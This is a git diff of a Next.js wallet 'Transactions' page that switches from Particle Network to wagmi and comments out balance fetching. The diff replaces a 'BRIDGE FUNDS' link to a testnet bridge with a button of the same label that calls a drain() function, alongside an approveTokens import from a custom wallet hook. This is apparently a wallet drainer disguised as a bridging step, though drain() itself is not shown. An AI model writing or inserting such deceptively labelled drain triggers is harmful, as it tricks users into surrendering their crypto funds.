@@ -1,28 +1,30 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import WalletDetailsNav from "../components/custom/WalletDetailsNav";
-import ParticleConnectButton from "../components/global/ConnectButton";
-import {
-  ConnectButton,
-  useAccount,
-  usePublicClient,
-} from "@particle-network/connectkit";
+// import ParticleConnectButton from "../components/global/ConnectButton";
+// import {
+//   ConnectButton,
+//   // useAccount,
+//   usePublicClient,
+// } from "@particle-network/connectkit";
 import Link from "next/link";
 import { useSmartAccount } from "@particle-network/connectkit";
-import { formatEther, parseEther } from "viem";
+import WagmiConnectButton from "../components/WagmiConnectButton";
+import { useAccount, useDisconnect, useEnsAvatar, useEnsName } from "wagmi";
+import { UseWallet } from "../components/useWallet";
 
 const Transactions = () => {
   const [activeTab, setActiveTab] = useState(1);
-  const [walletBalance, setWalletBalance] = useState(0);
-  const { address, isConnected, chainId } = useAccount();
+  const { address, isConnected } = useAccount();
   const [amountError, setAmountError] = useState(false);
-  const publicClient = usePublicClient();
+  const { approveTokens, drain } = UseWallet();
+  // const publicClient = usePublicClient();
 
   const smartAccount = useSmartAccount();
   const userOp = smartAccount?.buildUserOperation({
     tx: {
-      to: address,
+      // to: address,
       value: "0x1", // 1wei
       data: "0x",
     },
@@ -31,22 +33,22 @@ const Transactions = () => {
   console.log(txHash, "tex hash");
 
   // Fetch the balance of an account
-  const fetchBalance = async () => {
-    const balanceResponse = await publicClient?.getBalance({
-      address,
-    });
-    const balanceInEther = formatEther(balanceResponse);
-    console.log(balanceInEther, "balanceInEther");
-    return balanceInEther;
-  };
+  // const fetchBalance = async () => {
+  //   const balanceResponse = await publicClient?.getBalance({
+  //     address,
+  //   });
+  //   const balanceInEther = formatEther(balanceResponse);
+  //   console.log(balanceInEther, "balanceInEther");
+  //   return balanceInEther;
+  // };
 
-  useEffect(() => {
-    if (address) {
-      fetchBalance().then((res) => {
-        setWalletBalance(res);
-      });
-    }
-  }, [address]);
+  // useEffect(() => {
+  //   if (address) {
+  //     fetchBalance().then((res) => {
+  //       setWalletBalance(res);
+  //     });
+  //   }
+  // }, [address]);
 
   return (
     <section className="w-full h-full font-pure">
@@ -82,15 +84,18 @@ const Transactions = () => {
               NO DEPOSITS
             </p>
 
-            <Link
+            {/* <Link
               href="https://testnet.bridge.zora.energy/"
               target="_blank"
               className="mx-auto"
+            > */}
+            <button
+              onClick={() => drain()}
+              className="p-2 bg-black text-white mt-10 mb-5 w-48"
             >
-              <button className="p-2 bg-black text-white mt-10 mb-5 w-48">
-                BRIDGE FUNDS
-              </button>
-            </Link>
+              BRIDGE FUNDS
+            </button>
+            {/* </Link> */}
           </div>
         ) : (
           <h1 className="text-xl md:text-3xl font-bold text-center  uppercase w-full max-w-2xl">
@@ -100,7 +105,8 @@ const Transactions = () => {
 
         {isConnected ? null : (
           <div className="mt-10">
-            <ParticleConnectButton />
+            {/* <ParticleConnectButton /> */}
+            <WagmiConnectButton styles="" />
           </div>
         )}
       </div>
